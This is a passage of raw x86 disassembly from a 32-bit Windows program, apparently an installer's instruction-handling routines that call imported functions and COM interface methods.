  401dd6:	83 e0 03             	and    $0x3,%eax
  401dd9:	83 e6 04             	and    $0x4,%esi
  401ddc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401ddf:	8b c1                	mov    %ecx,%eax
  401de1:	c1 e8 1f             	shr    $0x1f,%eax
  401de4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401de7:	8b c1                	mov    %ecx,%eax
  401de9:	c1 e8 1e             	shr    $0x1e,%eax
  401dec:	83 e0 01             	and    $0x1,%eax
  401def:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401df5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401df8:	74 09                	je     0x401e03
  401dfa:	6a 11                	push   $0x11
  401dfc:	e8 d1 0f 00 00       	call   0x402dd2
  401e01:	eb 04                	jmp    0x401e07
  401e03:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e07:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401e0a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401e0d:	50                   	push   %eax
  401e0e:	ff 75 08             	push   0x8(%ebp)
  401e11:	ff 15 64 82 40 00    	call   *0x408264
  401e17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e1a:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e1f:	50                   	push   %eax
  401e20:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401e23:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e27:	50                   	push   %eax
  401e28:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e2b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e2f:	50                   	push   %eax
  401e30:	ff 75 c8             	push   -0x38(%ebp)
  401e33:	f7 de                	neg    %esi
  401e35:	ff 75 bc             	push   -0x44(%ebp)
  401e38:	1b f6                	sbb    %esi,%esi
  401e3a:	23 35 00 47 43 00    	and    0x434700,%esi
  401e40:	56                   	push   %esi
  401e41:	ff 15 44 82 40 00    	call   *0x408244
  401e47:	8b f0                	mov    %eax,%esi
  401e49:	56                   	push   %esi
  401e4a:	ff 75 c8             	push   -0x38(%ebp)
  401e4d:	68 72 01 00 00       	push   $0x172
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff 15 58 82 40 00    	call   *0x408258
  401e5b:	3b c3                	cmp    %ebx,%eax
  401e5d:	74 0c                	je     0x401e6b
  401e5f:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e62:	75 07                	jne    0x401e6b
  401e64:	50                   	push   %eax
  401e65:	ff 15 54 80 40 00    	call   *0x408054
  401e6b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e6e:	0f 8c e2 0d 00 00    	jl     0x402c56
  401e74:	56                   	push   %esi
  401e75:	e9 18 f7 ff ff       	jmp    0x401592
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	ff 15 48 82 40 00    	call   *0x408248
  401e83:	6a 02                	push   $0x2
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 24 0f 00 00       	call   0x402db0
  401e8c:	59                   	pop    %ecx
  401e8d:	8b d8                	mov    %eax,%ebx
  401e8f:	6a 48                	push   $0x48
  401e91:	6a 5a                	push   $0x5a
  401e93:	56                   	push   %esi
  401e94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e97:	ff 15 48 80 40 00    	call   *0x408048
  401e9d:	50                   	push   %eax
  401e9e:	53                   	push   %ebx
  401e9f:	ff 15 48 81 40 00    	call   *0x408148
  401ea5:	56                   	push   %esi
  401ea6:	ff 75 f8             	push   -0x8(%ebp)
  401ea9:	f7 d8                	neg    %eax
  401eab:	a3 f0 cd 40 00       	mov    %eax,0x40cdf0
  401eb0:	ff 15 4c 82 40 00    	call   *0x40824c
  401eb6:	6a 03                	push   $0x3
  401eb8:	e8 f3 0e 00 00       	call   0x402db0
  401ebd:	a3 00 ce 40 00       	mov    %eax,0x40ce00
  401ec2:	8a 45 e0             	mov    -0x20(%ebp),%al
  401ec5:	59                   	pop    %ecx
  401ec6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ec9:	ff 75 d4             	push   -0x2c(%ebp)
  401ecc:	8a c8                	mov    %al,%cl
  401ece:	80 e1 01             	and    $0x1,%cl
  401ed1:	c6 05 07 ce 40 00 01 	movb   $0x1,0x40ce07
  401ed8:	88 0d 04 ce 40 00    	mov    %cl,0x40ce04
  401ede:	8a c8                	mov    %al,%cl
  401ee0:	80 e1 02             	and    $0x2,%cl
  401ee3:	24 04                	and    $0x4,%al
  401ee5:	68 0c ce 40 00       	push   $0x40ce0c
  401eea:	88 0d 05 ce 40 00    	mov    %cl,0x40ce05
  401ef0:	a2 06 ce 40 00       	mov    %al,0x40ce06
  401ef5:	e8 02 47 00 00       	call   0x4065fc
  401efa:	68 f0 cd 40 00       	push   $0x40cdf0
  401eff:	ff 15 5c 80 40 00    	call   *0x40805c
  401f05:	e9 5a 07 00 00       	jmp    0x402664
  401f0a:	53                   	push   %ebx
  401f0b:	e8 a0 0e 00 00       	call   0x402db0
  401f10:	6a 01                	push   $0x1
  401f12:	8b f0                	mov    %eax,%esi
  401f14:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f17:	e8 94 0e 00 00       	call   0x402db0
  401f1c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f1f:	59                   	pop    %ecx
  401f20:	59                   	pop    %ecx
  401f21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f24:	50                   	push   %eax
  401f25:	56                   	push   %esi
  401f26:	75 0b                	jne    0x401f33
  401f28:	ff 15 28 82 40 00    	call   *0x408228
  401f2e:	e9 23 0d 00 00       	jmp    0x402c56
  401f33:	ff 15 50 82 40 00    	call   *0x408250
  401f39:	e9 18 0d 00 00       	jmp    0x402c56
  401f3e:	53                   	push   %ebx
  401f3f:	e8 8e 0e 00 00       	call   0x402dd2
  401f44:	6a 31                	push   $0x31
  401f46:	8b f0                	mov    %eax,%esi
  401f48:	e8 85 0e 00 00       	call   0x402dd2
  401f4d:	6a 22                	push   $0x22
  401f4f:	8b d8                	mov    %eax,%ebx
  401f51:	e8 7c 0e 00 00       	call   0x402dd2
  401f56:	6a 15                	push   $0x15
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	e8 73 0e 00 00       	call   0x402dd2
  401f5f:	6a ec                	push   $0xffffffec
  401f61:	e8 bd f4 ff ff       	call   0x401423
  401f66:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f69:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f72:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f7b:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f7e:	66 8b 06             	mov    (%esi),%ax
  401f81:	66 f7 d8             	neg    %ax
  401f84:	1b c0                	sbb    %eax,%eax
  401f86:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f89:	23 c6                	and    %esi,%eax
  401f8b:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f8e:	66 8b 07             	mov    (%edi),%ax
  401f91:	66 f7 d8             	neg    %ax
  401f94:	1b c0                	sbb    %eax,%eax
  401f96:	c7 45 8c 00 00 44 00 	movl   $0x440000,-0x74(%ebp)
  401f9d:	23 c7                	and    %edi,%eax
  401f9f:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fa2:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401fa8:	50                   	push   %eax
  401fa9:	e8 37 3c 00 00       	call   0x405be5
  401fae:	85 c0                	test   %eax,%eax
  401fb0:	0f 84 a4 09 00 00    	je     0x40295a
  401fb6:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401fbd:	0f 84 93 0c 00 00    	je     0x402c56
  401fc3:	ff 75 ac             	push   -0x54(%ebp)
  401fc6:	e8 93 4a 00 00       	call   0x406a5e
  401fcb:	ff 75 ac             	push   -0x54(%ebp)
  401fce:	eb 47                	jmp    0x402017
  401fd0:	53                   	push   %ebx
  401fd1:	e8 fc 0d 00 00       	call   0x402dd2
  401fd6:	8b f0                	mov    %eax,%esi
  401fd8:	56                   	push   %esi
  401fd9:	6a eb                	push   $0xffffffeb
  401fdb:	e8 64 36 00 00       	call   0x405644
  401fe0:	56                   	push   %esi
  401fe1:	e8 bc 3b 00 00       	call   0x405ba2
  401fe6:	8b f0                	mov    %eax,%esi
  401fe8:	3b f3                	cmp    %ebx,%esi
  401fea:	0f 84 6a 09 00 00    	je     0x40295a
  401ff0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ff3:	74 21                	je     0x402016
  401ff5:	56                   	push   %esi
  401ff6:	e8 63 4a 00 00       	call   0x406a5e
  401ffb:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401ffe:	7c 0b                	jl     0x40200b
  402000:	50                   	push   %eax
  402001:	ff 75 f4             	push   -0xc(%ebp)
  402004:	e8 fd 44 00 00       	call   0x406506
  402009:	eb 0b                	jmp    0x402016
  40200b:	3b c3                	cmp    %ebx,%eax
  40200d:	74 07                	je     0x402016
  40200f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402016:	56                   	push   %esi
  402017:	ff 15 fc 80 40 00    	call   *0x4080fc
  40201d:	e9 34 0c 00 00       	jmp    0x402c56
  402022:	6a 02                	push   $0x2
  402024:	e8 a9 0d 00 00       	call   0x402dd2
  402029:	50                   	push   %eax
  40202a:	e8 ed 48 00 00       	call   0x40691c
  40202f:	8b f0                	mov    %eax,%esi
  402031:	3b f3                	cmp    %ebx,%esi
  402033:	74 13                	je     0x402048
  402035:	ff 76 14             	push   0x14(%esi)
  402038:	ff 75 f4             	push   -0xc(%ebp)
  40203b:	e8 c6 44 00 00       	call   0x406506
  402040:	ff 76 18             	push   0x18(%esi)
  402043:	e9 4a f5 ff ff       	jmp    0x401592
  402048:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204b:	66 89 1f             	mov    %bx,(%edi)
  40204e:	66 89 18             	mov    %bx,(%eax)
  402051:	e9 04 09 00 00       	jmp    0x40295a
  402056:	6a ee                	push   $0xffffffee
  402058:	e8 75 0d 00 00       	call   0x402dd2
  40205d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402060:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402063:	51                   	push   %ecx
  402064:	50                   	push   %eax
  402065:	6a 0b                	push   $0xb
  402067:	e8 47 49 00 00       	call   0x4069b3
  40206c:	ff d0                	call   *%eax
  40206e:	8b f0                	mov    %eax,%esi
  402070:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402073:	66 89 1f             	mov    %bx,(%edi)
  402076:	3b f3                	cmp    %ebx,%esi
  402078:	66 89 18             	mov    %bx,(%eax)
  40207b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402082:	0f 84 ce 0b 00 00    	je     0x402c56
  402088:	56                   	push   %esi
  402089:	6a 40                	push   $0x40
  40208b:	ff 15 10 81 40 00    	call   *0x408110
  402091:	3b c3                	cmp    %ebx,%eax
  402093:	89 45 08             	mov    %eax,0x8(%ebp)
  402096:	0f 84 ba 0b 00 00    	je     0x402c56
  40209c:	6a 0c                	push   $0xc
  40209e:	e8 10 49 00 00       	call   0x4069b3
  4020a3:	6a 0d                	push   $0xd
  4020a5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4020a8:	e8 06 49 00 00       	call   0x4069b3
  4020ad:	ff 75 08             	push   0x8(%ebp)
  4020b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020b3:	56                   	push   %esi
  4020b4:	53                   	push   %ebx
  4020b5:	ff 75 c8             	push   -0x38(%ebp)
  4020b8:	ff 55 c0             	call   *-0x40(%ebp)
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	74 3c                	je     0x4020fb
  4020bf:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4020c2:	50                   	push   %eax
  4020c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4020c6:	50                   	push   %eax
  4020c7:	68 14 a0 40 00       	push   $0x40a014
  4020cc:	ff 75 08             	push   0x8(%ebp)
  4020cf:	ff 55 e8             	call   *-0x18(%ebp)
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 25                	je     0x4020fb
  4020d6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020d9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020dc:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020e0:	57                   	push   %edi
  4020e1:	e8 20 44 00 00       	call   0x406506
  4020e6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020e9:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020ec:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020f0:	ff 75 f4             	push   -0xc(%ebp)
  4020f3:	e8 0e 44 00 00       	call   0x406506
  4020f8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020fb:	ff 75 08             	push   0x8(%ebp)
  4020fe:	e9 34 fb ff ff       	jmp    0x401c37
  402103:	39 1d c0 47 43 00    	cmp    %ebx,0x4347c0
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	0f 8c b9 00 00 00    	jl     0x4021cf
  402116:	6a f0                	push   $0xfffffff0
  402118:	e8 b5 0c 00 00       	call   0x402dd2
  40211d:	6a 01                	push   $0x1
  40211f:	8b f8                	mov    %eax,%edi
  402121:	e8 ac 0c 00 00       	call   0x402dd2
  402126:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402129:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40212c:	74 0e                	je     0x40213c
  40212e:	57                   	push   %edi
  40212f:	ff 15 14 81 40 00    	call   *0x408114
  402135:	3b c3                	cmp    %ebx,%eax
  402137:	89 45 08             	mov    %eax,0x8(%ebp)
  40213a:	75 11                	jne    0x40214d
  40213c:	6a 08                	push   $0x8
  40213e:	53                   	push   %ebx
  40213f:	57                   	push   %edi
  402140:	ff 15 18 81 40 00    	call   *0x408118
  402146:	3b c3                	cmp    %ebx,%eax
  402148:	89 45 08             	mov    %eax,0x8(%ebp)
  40214b:	74 7b                	je     0x4021c8
  40214d:	ff 75 bc             	push   -0x44(%ebp)
  402150:	ff 75 08             	push   0x8(%ebp)
  402153:	e8 ca 48 00 00       	call   0x406a22
  402158:	8b f8                	mov    %eax,%edi
  40215a:	3b fb                	cmp    %ebx,%edi
  40215c:	74 39                	je     0x402197
  40215e:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402161:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402164:	74 17                	je     0x40217d
  402166:	ff 75 d8             	push   -0x28(%ebp)
  402169:	e8 b5 f2 ff ff       	call   0x401423
  40216e:	ff d7                	call   *%edi
  402170:	85 c0                	test   %eax,%eax
  402172:	74 2d                	je     0x4021a1
  402174:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40217b:	eb 24                	jmp    0x4021a1
  40217d:	68 00 a0 40 00       	push   $0x40a000
  402182:	68 50 ce 40 00       	push   $0x40ce50
  402187:	56                   	push   %esi
  402188:	68 00 04 00 00       	push   $0x400
  40218d:	ff 75 f8             	push   -0x8(%ebp)
  402190:	ff d7                	call   *%edi
  402192:	83 c4 14             	add    $0x14,%esp
  402195:	eb 0a                	jmp    0x4021a1
  402197:	ff 75 bc             	push   -0x44(%ebp)
  40219a:	6a f7                	push   $0xfffffff7
  40219c:	e8 a3 34 00 00       	call   0x405644
  4021a1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4021a4:	0f 85 ac 0a 00 00    	jne    0x402c56
  4021aa:	ff 75 08             	push   0x8(%ebp)
  4021ad:	e8 7f 1a 00 00       	call   0x403c31
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	0f 84 9c 0a 00 00    	je     0x402c56
  4021ba:	ff 75 08             	push   0x8(%ebp)
  4021bd:	ff 15 1c 81 40 00    	call   *0x40811c
  4021c3:	e9 8e 0a 00 00       	jmp    0x402c56
  4021c8:	6a f6                	push   $0xfffffff6
  4021ca:	e9 4e 01 00 00       	jmp    0x40231d
  4021cf:	6a e7                	push   $0xffffffe7
  4021d1:	e9 47 01 00 00       	jmp    0x40231d
  4021d6:	6a f0                	push   $0xfffffff0
  4021d8:	e8 f5 0b 00 00       	call   0x402dd2
  4021dd:	6a df                	push   $0xffffffdf
  4021df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021e2:	e8 eb 0b 00 00       	call   0x402dd2
  4021e7:	6a 02                	push   $0x2
  4021e9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021ec:	e8 e1 0b 00 00       	call   0x402dd2
  4021f1:	6a cd                	push   $0xffffffcd
  4021f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f6:	e8 d7 0b 00 00       	call   0x402dd2
  4021fb:	6a 45                	push   $0x45
  4021fd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402200:	e8 cd 0b 00 00       	call   0x402dd2
  402205:	ff 75 bc             	push   -0x44(%ebp)
  402208:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40220b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40220e:	8b c8                	mov    %eax,%ecx
  402210:	8b f8                	mov    %eax,%edi
  402212:	8b f0                	mov    %eax,%esi
  402214:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40221a:	c1 f8 10             	sar    $0x10,%eax
  40221d:	c1 fe 0c             	sar    $0xc,%esi
  402220:	25 ff ff 00 00       	and    $0xffff,%eax
  402225:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402228:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40222e:	83 e6 07             	and    $0x7,%esi
  402231:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402234:	e8 cc 3c 00 00       	call   0x405f05
  402239:	85 c0                	test   %eax,%eax
  40223b:	75 07                	jne    0x402244
  40223d:	6a 21                	push   $0x21
  40223f:	e8 8e 0b 00 00       	call   0x402dd2
  402244:	8d 45 08             	lea    0x8(%ebp),%eax
  402247:	50                   	push   %eax
  402248:	68 d8 85 40 00       	push   $0x4085d8
  40224d:	6a 01                	push   $0x1
  40224f:	53                   	push   %ebx
  402250:	68 e8 85 40 00       	push   $0x4085e8
  402255:	ff 15 90 82 40 00    	call   *0x408290
  40225b:	3b c3                	cmp    %ebx,%eax
  40225d:	0f 8c b1 00 00 00    	jl     0x402314
  402263:	8b 45 08             	mov    0x8(%ebp),%eax
  402266:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402269:	52                   	push   %edx
  40226a:	68 f8 85 40 00       	push   $0x4085f8
  40226f:	8b 08                	mov    (%eax),%ecx
  402271:	50                   	push   %eax
  402272:	ff 11                	call   *(%ecx)
  402274:	3b c3                	cmp    %ebx,%eax
  402276:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402279:	0f 8c 87 00 00 00    	jl     0x402306
  40227f:	8b 45 08             	mov    0x8(%ebp),%eax
  402282:	ff 75 bc             	push   -0x44(%ebp)
  402285:	8b 08                	mov    (%eax),%ecx
  402287:	50                   	push   %eax
  402288:	ff 51 50             	call   *0x50(%ecx)
  40228b:	3b fb                	cmp    %ebx,%edi
  40228d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402290:	75 0e                	jne    0x4022a0
  402292:	8b 45 08             	mov    0x8(%ebp),%eax
  402295:	68 00 00 44 00       	push   $0x440000
  40229a:	50                   	push   %eax
  40229b:	8b 08                	mov    (%eax),%ecx
  40229d:	ff 51 24             	call   *0x24(%ecx)
  4022a0:	3b f3                	cmp    %ebx,%esi
  4022a2:	74 0a                	je     0x4022ae
  4022a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a7:	56                   	push   %esi
  4022a8:	50                   	push   %eax
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	ff 51 3c             	call   *0x3c(%ecx)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	ff 75 c0             	push   -0x40(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 34             	call   *0x34(%ecx)
  4022ba:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4022bd:	66 39 19             	cmp    %bx,(%ecx)
  4022c0:	74 0d                	je     0x4022cf
  4022c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c5:	ff 75 b0             	push   -0x50(%ebp)
  4022c8:	8b 10                	mov    (%eax),%edx
  4022ca:	51                   	push   %ecx
  4022cb:	50                   	push   %eax
  4022cc:	ff 52 44             	call   *0x44(%edx)
  4022cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d2:	ff 75 f8             	push   -0x8(%ebp)
  4022d5:	8b 08                	mov    (%eax),%ecx
  4022d7:	50                   	push   %eax
  4022d8:	ff 51 2c             	call   *0x2c(%ecx)
  4022db:	8b 45 08             	mov    0x8(%ebp),%eax
  4022de:	ff 75 f4             	push   -0xc(%ebp)
  4022e1:	8b 08                	mov    (%eax),%ecx
  4022e3:	50                   	push   %eax
  4022e4:	ff 51 1c             	call   *0x1c(%ecx)
  4022e7:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022ea:	7c 11                	jl     0x4022fd
  4022ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022ef:	6a 01                	push   $0x1
  4022f1:	ff 75 f0             	push   -0x10(%ebp)
  4022f4:	8b 08                	mov    (%eax),%ecx
  4022f6:	50                   	push   %eax
  4022f7:	ff 51 18             	call   *0x18(%ecx)
  4022fa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402300:	50                   	push   %eax
  402301:	8b 08                	mov    (%eax),%ecx
  402303:	ff 51 08             	call   *0x8(%ecx)
  402306:	8b 45 08             	mov    0x8(%ebp),%eax
  402309:	50                   	push   %eax
  40230a:	8b 08                	mov    (%eax),%ecx
  40230c:	ff 51 08             	call   *0x8(%ecx)
  40230f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402312:	7d 13                	jge    0x402327
  402314:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40231b:	6a f0                	push   $0xfffffff0
  40231d:	e8 01 f1 ff ff       	call   0x401423
  402322:	e9 2f 09 00 00       	jmp    0x402c56
  402327:	6a f4                	push   $0xfffffff4
  402329:	eb f2                	jmp    0x40231d
  40232b:	53                   	push   %ebx
  40232c:	e8 a1 0a 00 00       	call   0x402dd2
  402331:	6a 11                	push   $0x11
  402333:	8b f0                	mov    %eax,%esi
  402335:	e8 98 0a 00 00       	call   0x402dd2
  40233a:	6a 23                	push   $0x23
  40233c:	8b f8                	mov    %eax,%edi
  40233e:	e8 8f 0a 00 00       	call   0x402dd2
  402343:	56                   	push   %esi
  402344:	89 45 08             	mov    %eax,0x8(%ebp)
  402347:	e8 d0 45 00 00       	call   0x40691c
  40234c:	85 c0                	test   %eax,%eax
  40234e:	75 0d                	jne    0x40235d
  402350:	53                   	push   %ebx
  402351:	6a f9                	push   $0xfffffff9
  402353:	e8 ec 32 00 00       	call   0x405644
  402358:	e9 fd 05 00 00       	jmp    0x40295a
  40235d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402360:	56                   	push   %esi
  402361:	89 45 90             	mov    %eax,-0x70(%ebp)
  402364:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  40236b:	e8 65 42 00 00       	call   0x4065d5
  402370:	57                   	push   %edi
  402371:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402376:	e8 5a 42 00 00       	call   0x4065d5
  40237b:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402380:	8b 45 08             	mov    0x8(%ebp),%eax
  402383:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402387:	50                   	push   %eax
  402388:	53                   	push   %ebx
  402389:	89 75 98             	mov    %esi,-0x68(%ebp)
  40238c:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40238f:	89 45 aa             	mov    %eax,-0x56(%ebp)
  402392:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402396:	e8 a9 32 00 00       	call   0x405644
  40239b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40239e:	50                   	push   %eax
  40239f:	ff 15 80 81 40 00    	call   *0x408180
  4023a5:	85 c0                	test   %eax,%eax
  4023a7:	0f 84 a9 08 00 00    	je     0x402c56
  4023ad:	eb a1                	jmp    0x402350
  4023af:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023b4:	74 1d                	je     0x4023d3
  4023b6:	68 10 00 20 00       	push   $0x200010
  4023bb:	6a e8                	push   $0xffffffe8
  4023bd:	53                   	push   %ebx
  4023be:	e8 39 42 00 00       	call   0x4065fc
  4023c3:	50                   	push   %eax
  4023c4:	e8 56 38 00 00       	call   0x405c1f
  4023c9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023ce:	e9 8e 08 00 00       	jmp    0x402c61
  4023d3:	ff 05 94 47 43 00    	incl   0x434794
  4023d9:	e9 78 08 00 00       	jmp    0x402c56
  4023de:	33 f6                	xor    %esi,%esi
  4023e0:	33 ff                	xor    %edi,%edi
  4023e2:	3b c3                	cmp    %ebx,%eax
  4023e4:	74 08                	je     0x4023ee
  4023e6:	53                   	push   %ebx
  4023e7:	e8 e6 09 00 00       	call   0x402dd2
  4023ec:	8b f0                	mov    %eax,%esi
  4023ee:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023f1:	74 09                	je     0x4023fc
  4023f3:	6a 11                	push   $0x11
  4023f5:	e8 d8 09 00 00       	call   0x402dd2
  4023fa:	8b f8                	mov    %eax,%edi
  4023fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023ff:	74 09                	je     0x40240a
  402401:	6a 22                	push   $0x22
  402403:	e8 ca 09 00 00       	call   0x402dd2
  402408:	8b d8                	mov    %eax,%ebx
  40240a:	6a cd                	push   $0xffffffcd
  40240c:	e8 c1 09 00 00       	call   0x402dd2
  402411:	50                   	push   %eax
  402412:	53                   	push   %ebx
  402413:	57                   	push   %edi
  402414:	56                   	push   %esi
  402415:	ff 15 20 81 40 00    	call   *0x408120
  40241b:	e9 b9 f1 ff ff       	jmp    0x4015d9
  402420:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402425:	6a 01                	push   $0x1
  402427:	89 45 08             	mov    %eax,0x8(%ebp)
  40242a:	e8 a3 09 00 00       	call   0x402dd2
  40242f:	6a 12                	push   $0x12
  402431:	8b f0                	mov    %eax,%esi
  402433:	e8 9a 09 00 00       	call   0x402dd2
  402438:	6a dd                	push   $0xffffffdd
  40243a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40243d:	e8 90 09 00 00       	call   0x402dd2
  402442:	50                   	push   %eax
  402443:	68 ff 03 00 00       	push   $0x3ff
  402448:	8d 45 08             	lea    0x8(%ebp),%eax
  40244b:	57                   	push   %edi
  40244c:	50                   	push   %eax
  40244d:	ff 75 f0             	push   -0x10(%ebp)
  402450:	56                   	push   %esi
  402451:	ff 15 24 81 40 00    	call   *0x408124
  402457:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  40245b:	e9 1d f3 ff ff       	jmp    0x40177d
  402460:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402463:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402466:	75 2b                	jne    0x402493
  402468:	6a 02                	push   $0x2
  40246a:	e8 a3 09 00 00       	call   0x402e12
  40246f:	8b f0                	mov    %eax,%esi
  402471:	3b f3                	cmp    %ebx,%esi
  402473:	0f 84 e1 04 00 00    	je     0x40295a
  402479:	6a 33                	push   $0x33
  40247b:	e8 52 09 00 00       	call   0x402dd2
  402480:	50                   	push   %eax
  402481:	56                   	push   %esi
  402482:	ff 15 14 80 40 00    	call   *0x408014
  402488:	56                   	push   %esi
  402489:	8b f8                	mov    %eax,%edi
  40248b:	ff 15 10 80 40 00    	call   *0x408010
  402491:	eb 16                	jmp    0x4024a9
  402493:	6a 22                	push   $0x22
  402495:	e8 38 09 00 00       	call   0x402dd2
  40249a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40249d:	d1 f9                	sar    $1,%ecx
  40249f:	51                   	push   %ecx
  4024a0:	50                   	push   %eax
  4024a1:	56                   	push   %esi
  4024a2:	e8 e9 09 00 00       	call   0x402e90
  4024a7:	8b f8                	mov    %eax,%edi
  4024a9:	3b fb                	cmp    %ebx,%edi
  4024ab:	0f 84 a5 07 00 00    	je     0x402c56
  4024b1:	e9 a4 04 00 00       	jmp    0x40295a
  4024b6:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4024b9:	8b f8                	mov    %eax,%edi
  4024bb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024be:	6a 02                	push   $0x2
  4024c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024c3:	e8 0a 09 00 00       	call   0x402dd2
  4024c8:	6a 11                	push   $0x11
  4024ca:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024cd:	e8 00 09 00 00       	call   0x402dd2
  4024d2:	6a 02                	push   $0x2
  4024d4:	50                   	push   %eax
  4024d5:	57                   	push   %edi
  4024d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024dd:	e8 80 09 00 00       	call   0x402e62
  4024e2:	3b c3                	cmp    %ebx,%eax
  4024e4:	89 45 08             	mov    %eax,0x8(%ebp)
